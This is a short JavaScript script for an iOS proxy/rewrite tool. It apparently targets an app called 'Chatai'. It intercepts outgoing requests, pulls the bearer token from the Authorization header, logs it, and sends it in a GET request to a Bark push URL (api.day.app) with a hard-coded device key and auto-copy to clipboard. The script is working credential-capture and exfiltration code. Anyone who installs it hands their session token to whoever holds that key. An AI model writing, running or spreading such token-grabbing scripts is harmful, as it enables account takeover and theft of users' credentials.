const headers = $request?.headers || {};

let auth =
  headers.Authorization ||
  headers.authorization;

if (!auth) {
  $done({});
  return;
}

// 去掉 Bearer
const token = auth.replace(/^Bearer\s+/i, "");

// ====== Bark 推送（替代通知 + 剪贴板）======
$http({
  url:
    "https://api.day.app/wpgnnhHjPuze3cscmxSFyU/自动复制推送内容到剪切板?autoCopy=1&automaticallyCopy=1&copy=" +
    encodeURIComponent(token) +
    "?autoCopy=1",
  method: "GET",
}).then(
  (resp) => {
    console.log("BARK SUCCESS:", resp.status);
  },
  (err) => {
    console.log("BARK ERROR:", err);
  }
);

// ====== Loon 原生通知（已禁用）======
// $notification.post("Chatai Token", "已获取", token);

console.log(token);

$done({});